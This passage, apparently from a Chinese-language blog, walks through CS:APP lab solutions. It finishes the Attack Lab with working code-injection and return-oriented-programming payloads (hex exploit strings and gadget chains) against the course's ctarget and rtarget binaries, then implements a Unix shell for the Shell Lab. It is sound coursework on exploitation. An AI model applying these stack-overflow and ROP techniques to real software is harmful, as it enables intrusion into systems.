mov    $0x403138,%esi</span><br><span class="line">  401922:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401927:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40192c:	e8 bf f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401931:	bf 03 00 00 00       	mov    $0x3,%edi</span><br><span class="line">  401936:	e8 52 03 00 00       	callq  401c8d &lt;validate&gt;</span><br><span class="line">  40193b:	eb 21                	jmp    40195e &lt;touch3+0x64&gt;</span><br><span class="line">  40193d:	48 89 da             	mov    %rbx,%rdx</span><br><span class="line">  401940:	be 60 31 40 00       	mov    $0x403160,%esi</span><br><span class="line">  401945:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40194a:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40194f:	e8 9c f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401954:	bf 03 00 00 00       	mov    $0x3,%edi</span><br><span class="line">  401959:	e8 f1 03 00 00       	callq  401d4f &lt;fail&gt;</span><br><span class="line">  40195e:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401963:	e8 d8 f4 ff ff       	callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>所以 touch3 的地址是 <code>0x4018fa</code> ，然后cookie转ASCII结果为 59b997fa -&gt; 35 39 62 39 39 37 66 61 00</p>
<p>汇编代码执行到touch3的时候栈顶会变成<code>0x5561dca8</code>，如果在小于此地址的地方写数据在执行touch3的时候会被新压入栈的数据覆写掉中，所以最后注入的代码就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x5561dca8,%rdi</span><br><span class="line">pushq $0x4018fa</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>其余操作和上一题相同，最后可以发现执行成功。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@debian:~/ipads/training/ics-lab# ./ctarget -qi phase3.txt </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch3!: You called touch3("59b997fa")</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 </span><br><span class="line">FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 </span><br><span class="line">62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
<h2 id="Return-Oriented-Programming"><a href="#Return-Oriented-Programming" class="headerlink" title="Return Oriented Programming"></a>Return Oriented Programming</h2><p>这一部分是攻击rtarget这个文件，和之前不同的是rtarget有一些保护措施，例如栈地址随机化和部分栈内容是只读的，因此像ctarget一样直接注入代码是没有用的，对于这种保护措施，我们依然有方法去进行攻击，这个就是Return Oriented Programming</p>
<p>这种攻击方式的原理是，程序的汇编语言代码中，会出现我们需要的代码片段，并且以0xc3，也就是返回为终止，这种代码片段叫做gadget，合理利用gadget，我们就能实现return oriented programming这种攻击模式。举个例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span>&#123;    </span><br><span class="line">    *p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述这段代码，是将一个unsigned指针的值改变成一个奇怪数字，我们来观察它的汇编语言代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">	400f15:       c7 07 d4 48 89 c7       movl   $0xc78948d4,(%rdi)</span><br><span class="line">    400f1b:       c3                      retq</span><br></pre></td></tr></table></figure>
<p>我们发现第一行是48 89 c7，这个在x86-64汇编语言中代表了movq %rax, %rdi这条语句，并且以c3也就是retq为结束，即如果我们能够让程序从400f18开始运行，则相当于运行了movq %rax, %rdi，并且返回。</p>
<p>我们可以利用程序本身的代码，构造出一组由不同的返回地址组成的攻击代码，每一个返回地址都指向了一个函数的最末尾的若干字节，由ret结尾。这样，程序就会按照我们设计的顺序依次执行这些代码片段，以达到修改程序行为的结果，这就是返回导向编程。这些代码片段被称作gadget，而这些gadgets共同组成了一个gadget farm。</p>
<h3 id="phase-4-1"><a href="#phase-4-1" class="headerlink" title="phase_4"></a>phase_4</h3><p>利用gadget实现phase2的攻击，也就是运行touch2，题目有一个提示，我们只需要用到start_farm和mid_farm中间的gadget就可以了。</p>
<p>我们首先观察gadget_farm中的相关gadgets，并决定其是否可以用作攻击。根据上述的思路，我们可以得到两个gadget set_val426及getval_280，它们的反汇编代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:  </span><br><span class="line">	4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)  </span><br><span class="line">	4019c9:       c3					  retq  </span><br><span class="line">00000000004019ca &lt;getval_280&gt;:  </span><br><span class="line">	4019ca:       b8 29 58 90 c3          mov    $0xc3905829,%eax  </span><br><span class="line">	4019cf:       c3                      retq</span><br></pre></td></tr></table></figure>
<p>setval_426中的48 89 c7 90 c3可以被解释为mov %rax,%rdi nop ret，而getval_280中的58 90 c3可以被解释为pop %rax nop ret，将这两个gadget结合，即可以得到阶段4的结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</span><br><span class="line">cc 19 40 00 00 00 00 00 /* pop %rax */</span><br><span class="line">fa 97 b9 59 00 00 00 00 /* cookie */</span><br><span class="line">c5 19 40 00 00 00 00 00 /* mov %rax,%rdi */</span><br><span class="line">ec 17 40 00 00 00 00 00 /* touch2 */</span><br></pre></td></tr></table></figure>
<h3 id="phase-5-1"><a href="#phase-5-1" class="headerlink" title="phase_5"></a>phase_5</h3><p>首先将rsp存入某个寄存器之中，然后再将一个特定的常量pop至另一个寄存器之中，最后将这两个值分别存入%rsi和%rdi，调用add_xy将其相加得到字符串的首地址，并将结果%rax存入%rdi之中，最后再调用函数touch3即可。受制于gadget的种类，我们可能会用到多个gadget做中转。最终的攻击代码如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</span><br><span class="line">06 1a 40 00 00 00 00 00 /* mov %rsp,%rax */</span><br><span class="line">a2 19 40 00 00 00 00 00 /* mov %rax,%rdi &lt;- %rax指向的地址*/</span><br><span class="line">ab 19 40 00 00 00 00 00 /* pop %rax */</span><br><span class="line">48 00 00 00 00 00 00 00 /* offset constant*/</span><br><span class="line">dd 19 40 00 00 00 00 00 /* mov %eax,%edx */</span><br><span class="line">34 1a 40 00 00 00 00 00 /* mov %edx,%ecx */</span><br><span class="line">13 1a 40 00 00 00 00 00 /* mov %ecx,%esi */</span><br><span class="line">d6 19 40 00 00 00 00 00 /* add_xy */</span><br><span class="line">a2 19 40 00 00 00 00 00 /* mov %rax,%rdi */</span><br><span class="line">fa 18 40 00 00 00 00 00 /* touch3 */</span><br><span class="line">35 39 62 39 39 37 66 61 /* cookie的字符串表示 与前面保存的rsp总共差了9条语句 故常量为0x48*/00</span><br></pre></td></tr></table></figure>
<h1 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h1><p>题目要求实现一个简易的shell加强对进程控制与信号传递的理解，shell程序框架已经帮你搭建好了，只需修改 tsh.c 文件完成以下六个函数，修改后记得用 make 编译一下：</p>
<ul>
<li><strong>eval</strong>: 主要对命令行进行分词并执行指令</li>
<li><strong>builtin_cmd</strong>: 检查是否为内置指令</li>
<li><strong>do_bgfg</strong>: 执行fg、bg指令</li>
<li><strong>waitfg</strong>: 等待fg指令执行完毕</li>
<li><strong>sigchld_handler</strong>: SIGCHLD信号处理函数</li>
<li><strong>sigint_handler</strong>: SIGINT信号处理函数（ctrl-c）</li>
<li><strong>sigtstp_handler</strong>: SIGTSTP信号处理函数（ctrl-z）</li>
</ul>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h3><p>信号是一种消息，用来通知进程发生了某种事件</p>
<ul>
<li><p>类似于(akin to)异常和中断，这个消息是从内核发送至一个进程（有时是应另一个进程的要求）</p>
</li>
<li><p>信号类型是1~30的编号，信号传递的唯一信息是它的信号ID和它到达的事实。</p>
</li>
<li><p><strong>发送信号的原因</strong>：</p>
<ul>
<li>内核检测到一个系统事件，如Ctrl-C（SIGINT），除零（SIGFPE），或一个子进程的终止（SIGCHLD）</li>
</ul>
</li>
<li>另一个进程调用了kill函数（kill函数是发送信号的函数，不要误认为是kill进程的函数）<ul>
<li>当一个<strong>目标进程</strong>被<strong>内核强迫以某种方式对信号的传递做出反应时</strong>，它就会接收一个信号</li>
</ul>
</li>
<li>接收信号是不排队的（信号存储是一个位图，每一位代表一种信号，所以多个同种信号也只会存一次）<ul>
<li><strong>信号接收的时间：上下文切换</strong>（上下文切换的时候，本来执行进程A，内核态准备切换到进程B执行时，会去检查是否有收到信号，并去处理）</li>
</ul>
</li>
<li><p>对信号的三种反应： 忽略信号、终止进程、捕捉这个信号，执行用户级的信号处理程序（类似于硬件异常处理程序被调用以响应异步中断）</p>
</li>
<li><p>阻塞信号：有时代码需要运行在一个不能被中断的部分，用sigprocmask()函数实现</p>
</li>
<li><p>等待信号：有时，我们想暂停执行，直到得到一个特定的信号，用sigsuspend()实现</p>
</li>
<li>SIGKILL and SIGSTOP不能被改变反应行为</li>
</ul>
<h2 id="步骤流程"><a href="#步骤流程" class="headerlink" title="步骤流程"></a>步骤流程</h2><h3 id="01"><a href="#01" class="headerlink" title="01"></a>01</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">stardust@LAPTOP-4IJ6JI22:/mnt/e/Program/ipads/training/ics-lab$ make</span><br><span class="line">gcc -Wall -O2    tsh.c   -o tsh</span><br><span class="line">gcc -Wall -O2    myspin.c   -o myspin</span><br><span class="line">gcc -Wall -O2    mysplit.c   -o mysplit</span><br><span class="line">gcc -Wall -O2    mystop.c   -o mystop</span><br><span class="line">gcc -Wall -O2    myint.c   -o myint</span><br><span class="line">stardust@LAPTOP-4IJ6JI22:/mnt/e/Program/ipads/training/ics-lab$ make test01</span><br><span class="line">./sdriver.pl -t trace01.txt -s ./tsh -a "-p"</span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> trace01.txt - Properly terminate on EOF.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
<p>看起来没有什么问题，我们来进行下一步试试。</p>
<h3 id="02"><a href="#02" class="headerlink" title="02"></a>02</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stardust@LAPTOP-4IJ6JI22:/mnt/e/Program/ipads/training/ics-lab$ make test02</span><br><span class="line">./sdriver.pl -t trace02.txt -s ./tsh -a "-p"</span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> trace02.txt - Process <span class="built_in">builtin</span> quit <span class="built_in">command</span>.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
<p>我们发现程序卡在了这一步上，于是我们打开 trace02 发现有一条 quit 指令没执行，然后发现eval和builtin_command函数空空如也，于是就开始照搬一下书上P525的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[MAXLINE];    <span class="comment">/* Argument list execve() */</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];      <span class="comment">/* Hold modified commend line */</span></span><br><span class="line">    <span class="keyword">int</span> bg;                 <span class="comment">/* Should the job run in bg or fg? */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strcpy</span>(buf,cmdline);		</span><br><span class="line">    bg=parseline(cmdline,argv);	</span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">0</span>]==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> ;    <span class="comment">/* ignore empty line */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!builtin_cmd(argv)) &#123;</span><br><span class="line">        <span class="keyword">if</span>((pid=fork())==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* child runs user job */</span></span><br><span class="line">            <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) <span class="comment">// if execve error return 0</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%s: Command not found\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!bg) &#123;</span><br><span class="line">            <span class="keyword">int</span> status;</span><br><span class="line">            <span class="keyword">if</span> (waitpid(pid, &amp;status, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">                unix_error(<span class="string">"waitfg: waitpid error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d %s"</span>, pid, cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"quit"</span>)) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"&amp;"</span>)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后 make 一下发现运行ok无误，于是开始下一个，发现03和04都没有问题，直到05开始。</p>
<h3 id="05"><a href="#05" class="headerlink" title="05"></a>05</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> trace05.txt - Process <span class="built_in">jobs</span> <span class="built_in">builtin</span> <span class="built_in">command</span>.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line">/bin/echo -e tsh&gt; ./myspin 2 \046</span><br><span class="line">./myspin 2 &amp;</span><br><span class="line"></span><br><span class="line">/bin/echo -e tsh&gt; ./myspin 3 \046</span><br><span class="line">./myspin 3 &amp;</span><br><span class="line"></span><br><span class="line">/bin/echo tsh&gt; jobs</span><br><span class="line">jobs</span><br></pre></td></tr></table></figure>
<p>到了05的时候，我们发现jobs这个命令需要我们自己实现，我们首先要在<code>builtin_cmd</code>函数中，加入对<code>jobs</code>指令的检测，接着调用<code>listjobs(jobs);</code>（这个函数是lab里给你写好的，直接用就好了）</p>
<blockquote>
<p><em>/\</em> listjobs - Print the job list */<em><br>void <strong>listjobs</strong>(struct job_t </em>jobs)</p>
</blockquote>
<p>如果要调用该函数，job list也必须进行相应的改变，这一实现必须在<code>eval</code>的父进程中实现。思路是每执行一个任务，就在job list中添加一项，每结束一个任务，就将对应pid的任务在list中删除。在访问全局变量以及创建子进程的过程中需要将SIGCHLD信号进行阻塞，否则会发生意想不到的错误（因为僵尸进程的SIGCHLD信号，导致先运行deletejob再运行addjob产生意外错误）这里代码我们可以参考书本543页的示例，在fork前阻塞SIGCHLD信号，然后在调用addjob之后取消阻塞这种信号，保证了子进程在被加到job list之后回收该子进程。TIPS，子进程继承了其父进程的被阻塞set，所以要在调用exec前解除子进程被阻塞的SIGCHLD信号。</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line">&gt; <span class="function"><span class="keyword">int</span> <span class="title">sigprocmask</span><span class="params">( <span class="keyword">int</span> how, <span class="keyword">const</span> <span class="keyword">sigset_t</span> *<span class="keyword">restrict</span> <span class="built_in">set</span>, <span class="keyword">sigset_t</span> *<span class="keyword">restrict</span> oset )</span></span>;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
<p><strong>一个进程的信号屏蔽字规定了当前阻塞而不能递送给该进程的信号集</strong>。调用函数<code>sigprocmask</code>可以检测或更改其信号屏蔽字，<strong>不能阻塞SIGKILL和SIGSTOP信号</strong>。返回值：若成功则返回0，若出错则返回-1<br>若<strong>oset</strong>是非空指针，那么进程的当前信号屏蔽字通过oset返回。<br>若<strong>set</strong>是一个非空指针，则参数how指示如何修改当前信号屏蔽字。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>how</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>SIG_BLOCK</td>
<td>该进程新的信号屏蔽字是其当前信号屏蔽字和set指向信号集的并集。set包含了我们希望阻塞的附加信号</td>
</tr>
<tr>
<td>SIG_UNBLOCK</td>
<td>该进程新的信号屏蔽字是其当前信号屏蔽字和set所指向信号集补集的交集。set包含了我希望解除阻塞的信号</td>
</tr>
<tr>
<td>SIG_SETMASK</td>
<td>该进程新的信号屏蔽字将被set指向的信号集的值代替</td>
</tr>
</tbody>
</table>
</div>
<p>由此来举例子就是，<code>sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one)</code>因为maskone我们之前赋了SIGCHLD值，所以这句会直接让当前进程屏蔽SIGCHLD信号，并用prevone保存当前信号集，这样之后就刻意用<code>sigprocmask(SIG_SETMASK, &amp;prev_one, NULL)</code>来取消之前的阻塞。</p>
</blockquote>
<p>由此，我们可以将lab所给的函数完善一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[MAXLINE];    <span class="comment">/*Argument list execve()*/</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];      <span class="comment">/*Hold modified commend line*/</span></span><br><span class="line">    <span class="keyword">int</span> bg;                 <span class="comment">/*Should the job run in bg or fg?*/</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> state;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, mask_one, prev_one;</span><br><span class="line">    <span class="built_in">strcpy</span>(buf,cmdline);</span><br><span class="line">    bg=parseline(cmdline,argv);</span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">0</span>]==<span class="number">0</span>) </span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span>(!builtin_cmd(argv))&#123;</span><br><span class="line">        sigfillset(&amp;mask_all);</span><br><span class="line">        sigemptyset(&amp;mask_one);</span><br><span class="line">        sigaddset(&amp;mask_one, SIGCHLD);</span><br><span class="line">        sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one); <span class="comment">//Block SIGCHLD</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>((pid=fork())==<span class="number">0</span>) &#123;</span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>); <span class="comment">//UnBlock SIGCHLD</span></span><br><span class="line">            <span class="keyword">if</span> (setpgid(<span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">"SETPGID ERROR"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%s: Command not found\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            state = bg ? BG : FG;</span><br><span class="line">            sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>); <span class="comment">//parent process</span></span><br><span class="line">            addjob(jobs, pid, state, cmdline);</span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>); <span class="comment">//unblock SIGCHLD</span></span><br><span class="line">      &#125;</span><br><span class="line">        bg?<span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>,pid2jid(pid), pid, cmdline):waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"quit"</span>)) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"&amp;"</span>)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"jobs"</span>)) &#123;	</span><br><span class="line">        listjobs(jobs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;	</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, prev;</span><br><span class="line"></span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    <span class="keyword">while</span>((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status)) &#123;</span><br><span class="line">            sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">            deletejob(jobs, pid);	</span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一步其实工作量还是挺大的，需要仔细看下书本的内容（听听b站的网课）最后运行一下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">stardust@LAPTOP-4IJ6JI22:/mnt/e/Program/ipads/training/ics-lab$ make test05</span><br><span class="line">./sdriver.pl -t trace05.txt -s ./tsh -a "-p"</span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> trace05.txt - Process <span class="built_in">jobs</span> <span class="built_in">builtin</span> <span class="built_in">command</span>.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">tsh&gt;</span><span class="bash"> ./myspin 